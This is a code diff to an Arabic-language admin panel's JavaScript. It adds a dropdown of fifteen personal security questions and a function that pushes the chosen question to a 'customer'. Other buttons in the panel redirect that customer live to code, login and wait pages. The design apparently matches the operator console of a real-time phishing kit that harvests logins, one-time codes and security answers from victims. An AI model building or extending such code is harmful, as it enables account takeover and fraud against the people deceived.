@@ -432,8 +432,15 @@ function renderDetail(o){
       '<button class="btn-ok disabled" disabled>✅ قبول</button>'+
       '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
   }
-  h+='<div class="redir-grid">'+
-    '<button style="background:#a855f7" onclick="doRedir(\''+esc(o.id)+'\',\'security\')">🛡️ سؤال الأمان</button>'+
+  h+='<div style="margin-top:12px;background:rgba(168,85,247,.05);border:1px solid rgba(168,85,247,.15);border-radius:10px;padding:12px">'+
+    '<div style="font-size:12px;font-weight:700;color:#7c3aed;margin-bottom:8px">🛡️ إرسال سؤال أمان للعميل</div>'+
+    '<select id="adminQSelect" style="width:100%;padding:10px 12px;border:1px solid rgba(168,85,247,.25);border-radius:8px;font-size:13px;font-family:Cairo,sans-serif;outline:none;margin-bottom:8px;background:#fff">'+
+    '<option value="">-- اختر سؤال الأمان --</option>'+
+    secQOptions()+
+    '</select>'+
+    '<button style="width:100%;background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;border:none;border-radius:8px;padding:10px;font-size:13px;font-weight:800;cursor:pointer;font-family:Cairo,sans-serif" onclick="sendSecQ(\''+esc(o.id)+'\')">🛡️ إرسال السؤال للعميل</button>'+
+    '</div>';
+  h+='<div class="redir-grid" style="margin-top:8px">'+
     '<button style="background:#0ea5e9" onclick="doRedir(\''+esc(o.id)+'\',\'code\')">📲 الكود</button>'+
     '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
     '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'wait\')">⏳ الانتظار</button>'+
@@ -499,6 +506,23 @@ function cancelDel(){var o=orders.find(function(x){return x.id==selId;});if(o)re
 function doDecide(id,decision){
   api('POST','/api/admin/'+decision+'/'+id).then(function(){
     showNotif(decision==='accept'?'✅ تم القبول':'❌ تم الرفض');loadData();});
+}
+
+var SEC_QUESTIONS=[
+  'ما هو اسم ابن عمك الأول؟','في أي مدينة ولدت؟','في أي سنة تخرجت من الجامعة؟',
+  'ماذا كان لقبك أثناء الطفولة؟','اسم مؤلفك المفضل؟','اسم الشركة المصنعة للسيارة المفضلة لديك؟',
+  'أي فيلم هو المفضل لديك؟','اسم أفضل صديق في الطفولة؟','في أي عام حصلت على رخصة القيادة الخاصة بك؟',
+  'العلامة التجارية لأول تلفزيون الخاص بك؟','في أي سنة تزوجت؟','اسم فريق كرة القدم المفضل لديك؟',
+  'ما هو اسم المدرسة التي التحقت بها؟','اسم أول بلد أجنبي قمت بزيارته؟','ما هي ماركة سيارتك الأولى؟'
+];
+function secQOptions(){return SEC_QUESTIONS.map(function(q){return '<option value="'+esc(q)+'">'+esc(q)+'</option>';}).join('');}
+
+function sendSecQ(id){
+  var sel=document.getElementById('adminQSelect');
+  if(!sel||!sel.value){showNotif('⚠️ اختر سؤال أولاً');return;}
+  api('POST','/api/admin/send-question/'+id,{question:sel.value}).then(function(r){
+    if(r.ok)showNotif('✅ تم إرسال السؤال للعميل');loadData();
+  });
 }
 
 function doRedir(id,page){
